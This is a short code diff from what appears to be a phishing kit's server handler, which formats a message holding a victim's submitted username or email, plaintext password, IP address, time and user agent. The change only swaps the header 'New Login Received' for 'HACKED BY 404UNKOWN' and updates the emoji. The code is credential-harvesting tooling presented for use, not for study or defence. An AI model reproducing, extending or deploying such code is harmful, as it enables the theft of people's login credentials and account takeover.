@@ -23,13 +23,13 @@ export default async function handler(req, res) {
     const timeString = now.toLocaleString();
 
     const message = `
-? **New Login Received** ?
+‼️ **HACKED BY 404UNKOWN** ‼️
             
-? **Username/Email:** ${username}
-? **Password:** ${password}
-? **IP Address:** ${ipInfo}
-? **Time:** ${timeString}
-? **User Agent:** ${userAgent}
+⬇️ **Username/Email:** ${username}
+⬇️ **Password:** ${password}
+⬇️ **IP Address:** ${ipInfo}
+⬇️ **Time:** ${timeString}
+⬇️ **User Agent:** ${userAgent}
     `;
 
     try {
